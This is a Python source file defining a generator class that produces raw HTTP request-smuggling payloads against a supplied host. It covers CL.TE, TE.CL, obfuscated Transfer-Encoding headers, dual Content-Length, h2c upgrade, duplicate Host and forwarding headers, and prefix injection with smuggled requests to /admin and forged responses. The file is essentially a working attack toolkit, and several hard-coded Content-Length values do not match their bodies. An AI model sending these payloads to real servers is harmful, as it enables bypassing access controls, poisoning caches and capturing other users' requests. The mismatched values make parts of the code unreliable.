"""Advanced payload generation for all HTTP request smuggling types."""

from __future__ import annotations

from typing import List, Tuple


class AdvancedPayloadGenerator:
    """Comprehensive payload generation for all smuggling vulnerability types."""

    # ============ CL.TE (Content-Length vs Transfer-Encoding) ============

    @staticmethod
    def cl_te_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """Multiple CL.TE variants with different obfuscation techniques."""
        variants: List[Tuple[str, str]] = []

        # Basic CL.TE
        variants.append(
            (
                "CL.TE - Basic",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\nG",
            )
        )

        # CL.TE with smuggled request
        variants.append(
            (
                "CL.TE - Smuggled GET",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 44\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\n"
                "GET /admin HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "\r\n",
            )
        )

        # CL.TE with timeout
        variants.append(
            (
                "CL.TE - Timeout Delay",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 20\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\n"
                "X" * 15,
            )
        )

        # CL.TE with header injection
        variants.append(
            (
                "CL.TE - Header Injection",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 100\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\n"
                "GET / HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "X-Injected: true\r\n"
                "\r\n",
            )
        )

        return variants

    # ============ TE.CL (Transfer-Encoding vs Content-Length) ============

    @staticmethod
    def te_cl_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """Multiple TE.CL variants for response queue poisoning."""
        variants: List[Tuple[str, str]] = []

        # Basic TE.CL
        smuggled = "GPOST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\nx="
        variants.append(
            (
                "TE.CL - Basic Poisoning",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                f"{len(smuggled):x}\r\n"
                f"{smuggled}\r\n"
                "0\r\n\r\n",
            )
        )

        # TE.CL with admin access attempt
        smuggled_admin = "GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n"
        variants.append(
            (
                "TE.CL - Admin Access",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                f"{len(smuggled_admin):x}\r\n"
                f"{smuggled_admin}\r\n"
                "0\r\n\r\n",
            )
        )

        # TE.CL with cache bypass
        smuggled_cache = "GET /?x=1 HTTP/1.1\r\nHost: localhost\r\n\r\n"
        variants.append(
            (
                "TE.CL - Cache Bypass",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                f"{len(smuggled_cache):x}\r\n"
                f"{smuggled_cache}\r\n"
                "0\r\n\r\n",
            )
        )

        return variants

    # ============ TE.TE (Transfer-Encoding Obfuscation) ============

    @staticmethod
    def te_te_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """TE.TE variants exploiting different TE header handling."""
        variants: List[Tuple[str, str]] = []

        obfuscations = [
            ("Double TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
            ("Case Variation", "Transfer-Encoding: chunked\r\nTransfer-encoding: x"),
            ("Space Before Colon", "Transfer-Encoding : chunked"),
            ("Space After Value", "Transfer-Encoding: chunked "),
            ("Tab Separator", "Transfer-Encoding:\tchunked"),
            ("Line Wrapping", "Transfer-Encoding: chunked\r\n cow"),
            ("Identity Override", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
            ("X-Forwarded-Proto", "Transfer-Encoding: chunked\r\nX-Forwarded-Proto: http"),
            ("Null Byte", "Transfer-Encoding: chunked\r\nTransfer-Encoding: \x00chunked"),
        ]

        for name, te_header in obfuscations:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n"
                "Content-Length: 4\r\n"
                "\r\n"
                "0\r\n\r\n"
            )
            variants.append((f"TE.TE - {name}", payload))

        return variants

    # ============ CL.CL (Dual Content-Length) ============

    @staticmethod
    def cl_cl_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """CL.CL variants with conflicting Content-Length headers."""
        variants: List[Tuple[str, str]] = []

        # Basic CL.CL
        variants.append(
            (
                "CL.CL - Dual Headers",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Content-Length: 0\r\n"
                "\r\n"
                "SMUGGLED",
            )
        )

        # CL.CL with different values
        variants.append(
            (
                "CL.CL - Conflicting Values",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 8\r\n"
                "Content-Length: 20\r\n"
                "\r\n"
                "SMUGGLED_REQUEST",
            )
        )

        # CL.CL with space variations
        variants.append(
            (
                "CL.CL - Space Variation",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length : 6\r\n"
                "Content-Length: 0\r\n"
                "\r\n"
                "SMUGGLED",
            )
        )

        return variants

    # ============ HTTP/2 Smuggling ============

    @staticmethod
    def h2_smuggling_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """HTTP/2 specific smuggling via h2c upgrade or pseudo-header abuse."""
        variants: List[Tuple[str, str]] = []

        # HTTP/2 with conflicting pseudo-headers
        variants.append(
            (
                "H2 - Pseudo-Header Injection",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Upgrade: h2c\r\n"
                "Connection: Upgrade\r\n"
                "Content-Length: 0\r\n"
                "\r\n"
                "PRI * HTTP/2.0\r\n"
                "\r\n"
                "SM\r\n"
                "\r\n",
            )
        )

        # HTTP/2 downgrade attack
        variants.append(
            (
                "H2 - Downgrade Attack",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "HTTP2-Settings: AAMAAABkAAQBAAA=\r\n"
                "Upgrade: h2c\r\n"
                "Connection: Upgrade, HTTP2-Settings\r\n"
                "Content-Length: 0\r\n"
                "\r\n",
            )
        )

        return variants

    # ============ Request Smuggling via Headers ============

    @staticmethod
    def header_smuggling_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """Smuggling via header normalization differences."""
        variants: List[Tuple[str, str]] = []

        # X-Forwarded-For injection
        variants.append(
            (
                "Header - X-Forwarded-For Injection",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "X-Forwarded-For: 127.0.0.1\r\n"
                "X-Forwarded-For: 192.168.1.1\r\n"
                "Content-Length: 0\r\n"
                "\r\n",
            )
        )

        # Host header confusion
        variants.append(
            (
                "Header - Host Confusion",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Host: internal.local\r\n"
                "Content-Length: 0\r\n"
                "\r\n",
            )
        )

        # Content-Type smuggling
        variants.append(
            (
                "Header - Content-Type Smuggling",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: 0\r\n"
                "\r\n",
            )
        )

        return variants

    # ============ Prefix Injection ============

    @staticmethod
    def prefix_injection_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        """Prefix injection for cache poisoning."""
        variants: List[Tuple[str, str]] = []

        # Basic prefix injection
        variants.append(
            (
                "Prefix - Basic Injection",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 44\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\n"
                "GET /admin HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "\r\n",
            )
        )

        # Prefix with response splitting
        variants.append(
            (
                "Prefix - Response Splitting",
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 100\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n\r\n"
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/html\r\n"
                "Content-Length: 0\r\n"
                "\r\n",
            )
        )

        return variants

    @staticmethod
    def get_all_variants(host: str, path: str = "/") -> dict:
        """Get all smuggling variants organized by type."""
        return {
            "CL.TE": AdvancedPayloadGenerator.cl_te_variants(host, path),
            "TE.CL": AdvancedPayloadGenerator.te_cl_variants(host, path),
            "TE.TE": AdvancedPayloadGenerator.te_te_variants(host, path),
            "CL.CL": AdvancedPayloadGenerator.cl_cl_variants(host, path),
            "HTTP/2": AdvancedPayloadGenerator.h2_smuggling_variants(host, path),
            "Header": AdvancedPayloadGenerator.header_smuggling_variants(host, path),
            "Prefix": AdvancedPayloadGenerator.prefix_injection_variants(host, path),
        }
